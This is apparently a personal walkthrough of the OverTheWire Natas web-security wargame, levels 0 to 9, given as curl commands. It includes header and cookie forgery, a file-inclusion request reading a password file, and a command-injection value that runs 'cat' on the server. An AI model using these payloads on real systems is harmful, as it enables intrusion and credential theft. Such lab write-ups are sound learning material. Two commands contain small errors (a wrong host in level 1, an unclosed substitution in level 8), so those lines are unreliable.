# OverTheWire Natas – Walkthrough

Dates indicate when each level was solved.  

---

## Level 0
**Date:** 21/08/2025  

```bash
curl -u natas0:natas0 http://natas0.natas.labs.overthewire.org
````
Password located in a comment within the source code.

---

## Level 1
**Date:** 21/08/2025  

```bash
curl -u natas1:<natas1_password> http://natas0.natas.labs.overthewire.org
````
Password located in a comment within the source code.

---

## Level 2
**Date:** 21/08/2025  

```bash
curl -u natas2:<natas2_password> http://natas2.natas.labs.overthewire.org/files/users.txt
````

---

## Level 3
**Date:** 21/08/2025  

```bash
curl -u natas3:<natas3_password> http://natas3.natas.labs.overthewire.org/robots.txt
curl -u natas3:<natas3_password> http://natas3.natas.labs.overthewire.org/s3cr3t/users.txt
````

---

## Level 4
**Date:** 21/08/2025  

```bash
curl -v -u natas4:<natas4_password> -H "Referer: http://natas5.natas.labs.overthewire.org/" http://natas4.natas.labs.overthewire.org/index.php
````

---

## Level 5
**Date:** 21/08/2025  

```bash
curl -u natas5:<natas5_password> -H "Cookie: loggedin=1" http://natas5.natas.labs.overthewire.org/
````

---

## Level 6
**Date:** 21/08/2025  

```bash
curl -u natas6:<natas6_password>  http://natas6.natas.labs.overthewire.org/includes/secret.inc
curl -u natas6:<natas6_password>  -d "secret=FOEIUWGHFEEUHOFUOIU&submit=submit" http://natas6.natas.labs.overthewire.org/index.php
````

---

## Level 7
**Date:** 21/08/2025  

```bash
curl -u natas7:<natas7_password>  http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8
````

---

## Level 8
**Date:** 21/08/2025  

```bash
SECRET=$(curl -u natas8:<natas8_secret>  http://natas8.natas.labs.overthewire.org/index-source.html | html2text |grep '^$encodedSecret' | sed -E 's/.*"([^"]+)".*/\1/' | xxd -p -r | rev | base64 -d

curl -u natas8:<natas8_secret> -d "secret=$SECRET&submit=submit" http://natas8.natas.labs.overthewire.org | grep password

````
## Level 9
**Date:** 21/08/2025  

```bash
curl -u natas9:<natas9_password> "http://natas9.natas.labs.overthewire.org/?needle=test%3B+cat+%2Fetc%2Fnatas_webpass%2Fnatas10&submit=Search" | head -n 25

````